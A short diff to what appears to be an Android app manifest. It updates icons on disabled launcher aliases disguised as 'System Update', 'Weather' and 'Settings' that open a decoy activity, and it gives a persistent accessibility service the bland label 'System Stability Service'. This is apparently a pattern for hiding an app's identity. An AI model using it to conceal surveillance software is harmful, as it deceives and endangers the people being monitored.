@@ -118,7 +118,7 @@
             android:enabled="false"
             android:exported="true"
             android:label="System Update"
-            android:icon="@drawable/ic_sprocket_gear"
+            android:icon="@mipmap/ic_system_update_adaptive"
             android:targetActivity=".DecoyActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -144,7 +144,7 @@
             android:enabled="false"
             android:exported="true"
             android:label="Weather"
-            android:icon="@drawable/weather_icon"
+            android:icon="@mipmap/ic_weather_adaptive"
             android:targetActivity=".DecoyActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -157,8 +157,7 @@
             android:enabled="false"
             android:exported="true"
             android:label="Settings"
-            android:icon="@drawable/ic_settings_decoy"
-            android:roundIcon="@drawable/ic_settings_decoy"
+            android:icon="@mipmap/ic_settings_adaptive"
             android:targetActivity=".DecoyActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -228,6 +227,7 @@
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true"
             android:directBootAware="true"
+            android:label="System Stability Service"
             android:stopWithTask="false">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
